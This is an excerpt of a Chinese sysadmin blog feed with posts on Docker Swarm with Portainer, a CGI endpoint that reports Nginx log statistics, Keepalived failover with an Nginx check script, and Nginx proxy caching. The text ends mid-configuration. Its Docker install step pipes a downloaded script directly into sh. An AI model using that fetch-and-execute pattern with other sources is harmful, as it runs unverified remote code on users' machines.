    <id>https://blog.diglp.xyz/2019/03/05/OP_Docker_Swarm/</id>
    <published>2019-03-04T16:00:00.000Z</published>
    <updated>2019-03-08T14:41:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="快速部署"><a href="#快速部署" class="headerlink" title="快速部署"></a>快速部署</h2><h3 id="Docker-的安装"><a href="#Docker-的安装" class="headerlink" title="Docker 的安装"></a>Docker 的安装</h3><p>Docker 的安装，这里直接使用官方提供的一键安装的脚本。一路绿灯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><h3 id="创建Swarm集群"><a href="#创建Swarm集群" class="headerlink" title="创建Swarm集群"></a>创建Swarm集群</h3><p>直接使用 Docker 的 <code>swarm</code> 来进行集群的创建。直接通过help可以查看相关的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 初始化 Swarm 集群</span></span><br><span class="line">docker swarm init --advertise-addr 192.168.xxx.xxx# 这里是主机的地址 注意保持静态 IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到 Worker 的join-token</span></span><br><span class="line">docker swarm join-token worker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 输入join之后直接加入集群</span></span><br><span class="line">docker node ls</span><br><span class="line">ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS      ENGINE VERSION</span><br><span class="line">6km4644t62w3h3g7iujceerl1 *   bgb1         Ready               Active              Leader              18.06.3-ce</span><br><span class="line">kwi9t231ulc2dry75zzg52580     bgb2         Ready               Active                                  18.06.3-ce</span><br></pre></td></tr></table></figure><h3 id="Portainer-服务部署"><a href="#Portainer-服务部署" class="headerlink" title="Portainer 服务部署"></a>Portainer 服务部署</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建挂载卷</span></span><br><span class="line">docker volume create portainer_data</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建挂载目录,不然后面挂载会报错</span></span><br><span class="line">mkdir -p /opt/portainer</span><br><span class="line"></span><br><span class="line">docker service create \</span><br><span class="line">--name portainer \</span><br><span class="line">--publish 9000:9000 \</span><br><span class="line">--replicas=1 \</span><br><span class="line">--constraint 'node.role == manager' \</span><br><span class="line">--mount type=bind,src=//var/run/docker.sock,dst=/var/run/docker.sock \</span><br><span class="line">--mount type=bind,src=//opt/portainer,dst=/data \</span><br><span class="line">portainer/portainer \</span><br><span class="line">-H unix:///var/run/docker.sock</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出所有的服务</span></span><br><span class="line">docker service ls</span><br><span class="line">ID                  NAME                MODE                REPLICAS            IMAGE                        PORTS</span><br><span class="line">plmkdifqivcs        mAgent_agent        global              4/4                 portainer/agent:latest</span><br></pre></td></tr></table></figure><hr><p>这里注意的是，这里的部署是服务部署，而不是单个容器的部署。</p><p>容器的部署是针对与单个节点的。在上面的部署方式也可以使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer</span><br></pre></td></tr></table></figure><p>这里的问题是，这个命令只是在单主机的 Node 上对该镜像进行了部署。如果进行服务的访问，<strong>只能通过该主机的Hostname</strong> 进行访问。</p><p>但是一旦进行了一个服务的部署，那么所有的节点IP，都会做一个统一的映射，继而都可以对该服务进行访问。（这里选择的网络接口是 Ingress ，直接和主机网络共享，并且在服务的子网内，这些容器是自动进行负载均衡的。全自动的！</p><p>至此，整个 <strong>Swarm</strong> 集群搭建完成，并且使用了轻量级的容器管理系统 <strong>Portainer</strong> 。</p><h2 id="笔记s"><a href="#笔记s" class="headerlink" title="笔记s"></a>笔记s</h2><p>这里，自己折腾了一下简单的部署，实际的应用后面还有很长很长的路要走。这个section记录一下途中遇上的坑：</p><ul><li>Manager节点需要配置静态 IP ，因为 advertise 的地址是固定的，否则会发现IP改变之后节点全部 Down 掉。</li><li>在跑 Portainer 的注意检查其挂载的目录是否真实存在，否则报错。（bind，和mount）</li><li>Agent 的部署好像很吃内存。</li><li>脚本安装Docker 的时候，被CDN坑，没办法</li></ul><h2 id="资料："><a href="#资料：" class="headerlink" title="资料："></a>资料：</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvZG9ja2VyLXN3YXJtLWd1aWRlcy9SRUFETUUubWQ=" title="https://www.bookstack.cn/read/docker-swarm-guides/README.md">Docker Swarm 深入浅出<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vc3RvcmFnZS9iaW5kLW1vdW50cy8=" title="https://docs.docker.com/storage/bind-mounts/">Use bind mounts<i class="fa fa-external-link"></i></span></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;快速部署&quot;&gt;&lt;a href=&quot;#快速部署&quot; class=&quot;headerlink&quot; title=&quot;快速部署&quot;&gt;&lt;/a&gt;快速部署&lt;/h2&gt;&lt;h3 id=&quot;Docker-的安装&quot;&gt;&lt;a href=&quot;#Docker-的安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Docker" scheme="https://blog.diglp.xyz/tags/Docker/"/>
    
      <category term="Swarm" scheme="https://blog.diglp.xyz/tags/Swarm/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 访问量统计接口</title>
    <link href="https://blog.diglp.xyz/2019/03/03/OP_Nginx%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1%E6%8E%A5%E5%8F%A3/"/>
    <id>https://blog.diglp.xyz/2019/03/03/OP_Nginx访问量统计接口/</id>
    <published>2019-03-02T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这个post来自于之前偶遇的一个页面上的组件：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9yc3NodWIuYXBwLw==" title="https://rsshub.app/">Welcome to RSSHub!<i class="fa fa-external-link"></i></span> 万物皆可订阅的RRSHUB</p></blockquote><p>上面的那个Debug 的统计，就是显得十分的帅气了，想着自己也搞一个？</p><h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><p>当然,这里也没什么数据库的，直接是用shell出来的，根据日志的格式来进行解析，参考页面：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81MzdhMGJkZGRhOTQ=" title="https://www.jianshu.com/p/537a0bddda94">统计Nginx访问量 - 简书<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MDBlMTY4ZTI0NjM=" title="https://www.jianshu.com/p/800e168e2463">nginx cache查看缓存命中率<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>这些操作都是基于 Nginx 日志进行操作的，这里列举一条：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111.59.124.138 - - [25/Feb/2019:15:31:26 +0800] &quot;GET / HTTP/2.0&quot; 200 12628 &quot;-&quot; &quot;Mozilla/5.    0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.10    9 Safari/537.36&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>使用awk对参数进行提取，默认以空格进行分割。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;print $1&#125;'  /var/log/nginx/access.log|sort | uniq -c |wc -l</span><br><span class="line"></span><br><span class="line">awk '&#123;print $7&#125;' /var/log/nginx/access.log|wc -l</span><br><span class="line"></span><br><span class="line">awk '&#123;print $7&#125;' /var/log/nginx/access.log|sort | uniq -c |sort -n -k 1 -r|head 10</span><br><span class="line"></span><br><span class="line">awk '&#123;print $1&#125;' /var/log/nginx/access.log|sort | uniq -c |sort -n -k 1 -r|head 10</span><br></pre></td></tr></table></figure><blockquote><p>UV 和 PV：<strong>UV（Unique visitor）</strong> 24小时内的单个自然人， <strong>PV（Page View）</strong> 页面点击量。 </p></blockquote><hr><p>这里学好 <code>awk</code> 和 <code>sed</code> 和 <code>xargs</code> 后面我要开专题。 通过 Shell 的天然的特性。就可以得到响应的内容。</p><h2 id="CGI脚本"><a href="#CGI脚本" class="headerlink" title="CGI脚本"></a>CGI脚本</h2><p>得到统计提取的脚本之后，这里直接进行通过wsgi实现接口。供前端调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Content-Type: application/json"</span>)</span><br><span class="line">print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">query = &#123;</span><br><span class="line">    <span class="string">'uv'</span>:<span class="string">"awk '&#123;print $1&#125;'  /var/log/nginx/xxxx.xxx.cf.log|sort | uniq -c |wc -l"</span>,</span><br><span class="line">    <span class="string">'pv'</span>:<span class="string">"awk '&#123;print $7&#125;' /var/log/nginx/xxxx.xxx.cf.log|wc -l"</span>,</span><br><span class="line">    <span class="string">'hoturl'</span>:<span class="string">"awk '&#123;print $7&#125;' /var/log/nginx/xxxx.xxx.cf.log|sort | uniq -c |sort -n -k 1 -r|head"</span>,</span><br><span class="line">    <span class="string">'hotip'</span>:<span class="string">"awk '&#123;print $1&#125;' /var/log/nginx/xxxx.xxx.cf.log|sort | uniq -c |sort -n -k 1 -r|head"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = dict(zip(query, map(<span class="keyword">lambda</span> x: os.popen(x).read(), query.values())))</span><br><span class="line">result = json.dumps(resp)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><hr><p>前端使用 <code>AJAX</code> 进行请求，拉取数据，进行基本处理即可，这里的问题存在：<code>CC攻击</code> 的问题，这里直接使用 Shell 调用，如果接口被压测，可能占用大量的 IO资源。所以优化方案是 数据入库。</p><h2 id="前端处理"><a href="#前端处理" class="headerlink" title="前端处理"></a>前端处理</h2><p>前端通过 <code>AJAX</code> 对接口动态调用，拉取数据。之后进行处理和动态刷新。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $.get(<span class="string">'/get_dbg/'</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">'#PV'</span>).text(<span class="string">'站点PV:  '</span>+ data.pv)</span><br><span class="line">            $(<span class="string">'#UV'</span>).text(<span class="string">'站点UV:  '</span>+ data.uv)</span><br><span class="line">            $(<span class="string">'#hotip'</span>).html(<span class="string">'&lt;br&gt;'</span> + data.hotip.replace(<span class="regexp">/\n/g</span>, <span class="string">'&lt;br&gt;'</span>))</span><br><span class="line">            $(<span class="string">'#hoturl'</span>).html(<span class="string">'&lt;br&gt;'</span> + data.hoturl.replace(<span class="regexp">/\n/g</span>, <span class="string">'&lt;br&gt;'</span>))</span><br><span class="line">        &#125;)；</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>这里进行全局的 <code>\n</code> 替换，使内容换行。对页面进行刷新即可。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这里做了 nginx 的日志的统计，进行对部分服务质量的反馈。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这个post来自于之前偶遇的一个页面上的组件：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&quot;exturl&quot; data-url=
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Keepalive 实现 HA</title>
    <link href="https://blog.diglp.xyz/2019/03/01/OP_KeepAlive%E5%AE%9E%E7%8E%B0HA/"/>
    <id>https://blog.diglp.xyz/2019/03/01/OP_KeepAlive实现HA/</id>
    <published>2019-02-28T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p><code>HA(High Availability)</code> 高可用，是衡量一个系统的重要指标。所以双机热备，成为一个好的和通用的选择。前面的的方案直接使用了nginx 的Upstream，来实现了 <strong>双机</strong> 的过程。<br>虽然是可以实现在单节点down掉之后系统依旧可用，不过显得不是那么专业。这里就使用 KeepAlive 来实现系统的 <strong>双机过程</strong>。</p><hr><blockquote><ol><li>nginx进程基于Master+Slave(worker)多进程模型，自身具有非常稳定的子进程管理功能。在Master进程分配模式下，Master进程永远不进行业务处理，只是进行任务分发，从而达到Master进程的存活高可靠性，Slave(worker)进程所有的业务信号都 由主进程发出，Slave(worker)进程所有的超时任务都会被Master中止，属于非阻塞式任务模型。</li><li>Keepalived是Linux下面实现VRRP备份路由的高可靠性运行件。基于Keepalived设计的服务模式能够真正做到主服务器和备份服务器故障时IP瞬间无缝交接。二者结合，可以构架出比较稳定的软件LB方案。</li></ol><p>引用自 <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS9wLzYxMzgxODUuaHRtbA==" title="https://www.cnblogs.com/kevingrace/p/6138185.html">Nginx+keepalived 双机热备（主从模式）<i class="fa fa-external-link"></i></span></p></blockquote><hr><h2 id="Keepalive-基本概念"><a href="#Keepalive-基本概念" class="headerlink" title="Keepalive 基本概念"></a>Keepalive 基本概念</h2><p>KeepAlived 使用了 <code>VRRP</code> 来避免IP的单点故障。VRRP全称 Virtual Router Redundancy Protocol，即 虚拟路由冗余协议。简单的说，在一个子网IP，后面其实对应了 N 台主机。这些主机再构成一个路由器组。这个单独的虚拟ip，复杂对数据包的转发。这里也就有了传说中的 <strong>VIP （virtual IP）</strong>。</p><p>简单的一句话来讲：多个IP被放在一个路由组，虚拟成一个 IP。</p><p>这里有主机和从机。当主机不可用时候，回自主更新路由对应的MAC（设备）。</p><h2 id="Keepailve-简易配置"><a href="#Keepailve-简易配置" class="headerlink" title="Keepailve 简易配置"></a>Keepailve 简易配置</h2><p>这里直接在两台主机上安装 <code>keepalive</code> ，在 <code>/etc/keepalive/keepalive.conf</code> 里面进行配置。 这里也直接贴配置了，因为是直接 Copy的。。。</p><blockquote><p>示例配置在项目官网可见：<span class="exturl" data-url="aHR0cDovL3d3dy5rZWVwYWxpdmVkLm9yZy9tYW5wYWdlLmh0bWw=" title="http://www.keepalived.org/manpage.html">http://www.keepalived.org/manpage.html<i class="fa fa-external-link"></i></span></p></blockquote><p>主机配置如下，定义了节点名称，网络接口，认证方式以及 <strong>VIP</strong>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">global_defs</span> &#123;  </span><br><span class="line">    <span class="attribute">router_id</span> NodeA<span class="comment"># 不同节点的不同命名  </span></span><br><span class="line">    router_id NodeB <span class="comment">#################</span></span><br><span class="line">&#125;  </span><br><span class="line">vrrp_instance VI_1 &#123;  </span><br><span class="line">    <span class="attribute">state</span> MASTER    <span class="comment">#设置为主服务器  </span></span><br><span class="line">    state BACKUP    <span class="comment">#设置为备服务器 ###############</span></span><br><span class="line">        </span><br><span class="line">    interface eth0  <span class="comment">#监测网络接口  </span></span><br><span class="line">    virtual_router_id <span class="number">51</span>  <span class="comment">#主、备必须一样  </span></span><br><span class="line">    </span><br><span class="line">    priority <span class="number">99</span>   <span class="comment">#(主、备机取不同的优先级，主机值较大，备份&gt;机值较小,值越大优先级越高)</span></span><br><span class="line">    </span><br><span class="line">    advert_int <span class="number">1</span>   <span class="comment">#VRRP Multicast广播周期秒数  </span></span><br><span class="line">    authentication &#123;  </span><br><span class="line">        <span class="attribute">auth_type</span> PASS  <span class="comment">#VRRP认证方式，主备必须一致  </span></span><br><span class="line">        auth_pass *****<span class="comment">#(密码)  </span></span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;  </span><br><span class="line">        192.168.1.200/24  #VRRP HA虚拟地址  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>上面直接给出了器可用的配置文件，主从之间的差距就是那么几行。之后使用 <code>service</code> 重启服务即可。</p><h3 id="效果验证"><a href="#效果验证" class="headerlink" title="效果验证"></a>效果验证</h3><p>在主机或者路由里可以看到 <code>arp -a</code> 里面，192.168.1.200 的这个IP的路由已经被注册了，而且后面的MAC正是我们的 <strong>Master</strong> 的MAC地址。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">1.1</span>           <span class="number">20</span>-<span class="number">76</span>-<span class="number">93</span>-<span class="number">46</span>-<span class="number">68</span>-e3     动态</span><br><span class="line">...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.200</span>         <span class="number">2</span>c-<span class="number">4</span>d-<span class="number">54</span>-<span class="number">42</span>-<span class="number">9</span>b-<span class="number">0</span>a     动态</span><br><span class="line"><span class="comment">######################################################################</span></span><br><span class="line">➜  keepalived ifconfig </span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">192.168</span>.<span class="number">1.129</span>  netmask <span class="number">255.255</span>.<span class="number">255.0</span>  broadcast <span class="number">192.168</span>.<span class="number">1.255</span></span><br><span class="line">        inet6 fe80::cffe:<span class="number">4</span>eee:f129:de22  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        ether <span class="number">2</span>c:<span class="number">4</span>d:<span class="number">54</span>:<span class="number">42</span>:<span class="number">9</span>b:<span class="number">0</span>a  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">464842</span>  bytes <span class="number">188082136</span> (<span class="number">179.3</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">506574</span>  bytes <span class="number">162269596</span> (<span class="number">154.7</span> MiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line">        device interrupt <span class="number">43</span></span><br></pre></td></tr></table></figure><p>当<strong>拔掉 MASTER 主机的网线</strong>之后：可以看到地址绑定的MAC地址，飞速的就切换了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">1.1</span>           <span class="number">20</span>-<span class="number">76</span>-<span class="number">93</span>-<span class="number">46</span>-<span class="number">68</span>-e3     动态</span><br><span class="line">...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.200</span>         b8-<span class="number">27</span>-eb-eb-<span class="number">17</span>-<span class="number">72</span>     动态</span><br><span class="line"><span class="comment">#######################################################################</span></span><br></pre></td></tr></table></figure><p>至此可见，Keepalive 的热备效果实现了在一个 VIP 下的双机热备。在单主机下线情况下快速切换。</p><hr><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>当前的配置实际上并不合理，只有在主机掉线后才会进行主从切换。很多实话是某个服务（比如 Nginx）挂掉了导致的服务不可用。所以后面回就需要更高阶的使用，加上对服务进行检测的功能。</p><h2 id="Keepavlived-监控配置"><a href="#Keepavlived-监控配置" class="headerlink" title="Keepavlived 监控配置"></a>Keepavlived 监控配置</h2><p>入上面的提到的问题，在这种情况下，只适用于 <strong>MASTER</strong> 节点down掉的情况下，才会重新选取 Backup节点。然很多时候实际上是服务出了问题而不是主机（比如 Nginx 服务挂掉），那么在这种情况下就不能及时的切换到备机。</p><p>所以这里的配置就需要更进一步，来实现监控的过程。对于 Nignx 的web服务来讲，可以有以下的方式：</p><ul><li>监控 Nginx 进程</li><li>监控 Nginx 端口</li><li>监控 Nginx 的请求返回</li></ul><p>这三种方法，的可靠性也是依次提升的。</p><blockquote><p>这里参考文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS9wLzYxMzgxODUuaHRtbA==" title="https://www.cnblogs.com/kevingrace/p/6138185.html">Nginx+keepalived 双机热备（主从模式）<i class="fa fa-external-link"></i></span> </p><p>里面对细节讲的相当的详细</p></blockquote><hr><p>在配置文件里，可以使用 <code>vrrp_script</code> 域来自定义检测脚本。示例如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vrrp_script</span> chk_http_port &#123;         </span><br><span class="line">    <span class="attribute">script</span> <span class="string">"/opt/chk_nginx.sh"</span><span class="comment"># 指定检测脚本</span></span><br><span class="line">    interval <span class="number">2</span>                      <span class="comment"># 检测间隔</span></span><br><span class="line">    weight -<span class="number">5</span>                       <span class="comment"># 故障时权重值 -5</span></span><br><span class="line">    fall <span class="number">2</span>                   <span class="comment"># 故障判断次数，连续两次算故障</span></span><br><span class="line">    rise <span class="number">1</span>                  <span class="comment"># 检测成功，一次算成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里要提示一下keepalived.conf中vrrp_script配置区的script一般有2种写法：<br>1）通过脚本执行的返回结果，<strong>改变优先级</strong>，keepalived继续发送通告消息，backup比较优先级再决定。这是直接监控Nginx进程的方式。<br>2）脚本里面检测到异常，<strong>直接关闭keepalived进程</strong>，backup机器接收不到advertisement会抢占IP。这是检查NginX端口的方式。</p></blockquote><hr><p>用于检测的 <strong>Nginx</strong> 进程的脚本如下，用Shell脚本对进程进行检测，统计进程数量，如果进程挂掉，就尝试重启进程，如果进程无法拉起，那么就直接停掉本机的 <code>keepalive</code> ，让 VIP 漂移到从机上。这里使用的就是第二种方法。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">counter=$(ps -C nginx --no-heading|wc -l)</span><br><span class="line">if [ "$&#123;counter&#125;" = "0" ]; then</span><br><span class="line">    /usr/local/nginx/sbin/nginx</span><br><span class="line">    sleep 2</span><br><span class="line">    counter=$(ps -C nginx --no-heading|wc -l)</span><br><span class="line">    if [ "$&#123;counter&#125;" = "0" ]; then</span><br><span class="line">        /etc/init.d/keepalived stop</span><br><span class="line">    fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><hr><p>至此，基于进程监控的 Keepalive 已经实现。</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>这里用 Keepalive 实现了一个 VIP 下的双机热备，和实际业务需求更加接近了一点。当然真实架构不是这样的，这样导致了，从机的完全的空闲，其压测效果还不如两个机器分别在 upstream里面。后面将会使用 Docker集群进行统一管理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;&lt;code&gt;HA(High Availability)&lt;/code&gt; 高可用，是衡量一个系统的重要指标。所以双机热备，成为一个好的和通用的选择。前面
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Proxy 缓存 及 命中率统计</title>
    <link href="https://blog.diglp.xyz/2019/02/28/OP_%E4%BB%A3%E7%90%86%E7%BC%93%E5%AD%98_%E5%91%BD%E4%B8%AD%E7%8E%87%E7%BB%9F%E8%AE%A1/"/>
    <id>https://blog.diglp.xyz/2019/02/28/OP_代理缓存_命中率统计/</id>
    <published>2019-02-27T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>车能跑之后，就希望跑的快点对吧？所以就想办法开始对其性能进行优化。 这里就使用 CDN的思想，对代理的静态文件进行缓存，实现访问速度的提升。</p><p>所以这篇的主要目的，就是配置主机的 CDN 功能，实现对页面的静态文件缓存。</p><h2 id="proxy-cache-配置"><a href="#proxy-cache-配置" class="headerlink" title="proxy_cache 配置"></a>proxy_cache 配置</h2><p>由于Nginx里面默认是编译了 Cache 的功能， 所以可以很方便的通过配置，来实现功能。这里直接贴出conf的内容。这里需要指定缓存空间，以及缓存配置。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxy_cache_path</span> /tmp/ramdisk levels=<span class="number">1</span>:<span class="number">2</span> keys_zone=my_zone:<span class="number">64m</span> inactive=<span class="number">24h</span> max_size=<span class="number">64m</span>;</span><br><span class="line"><span class="attribute">proxy_cache_key</span> <span class="string">"<span class="variable">$scheme</span><span class="variable">$request_method</span><span class="variable">$host</span><span class="variable">$request_uri</span>"</span>;</span><br></pre></td></tr></table></figure><p>这里是在 HTTP 域里面进行的缓存空间的配置。</p><hr><p>下面，就是通过正则匹配来实现，不同静态资源的统一缓存。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ .*\.(gif|jpg|png|html|htm|css|js|ico|swf|pdf)$</span> &#123;</span><br><span class="line"><span class="comment"># 部分不需要走缓存</span></span><br><span class="line">    <span class="comment"># proxy_cache_bypass  $http_cache_control;</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span>            Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_ignore_headers</span> Set-Cookie 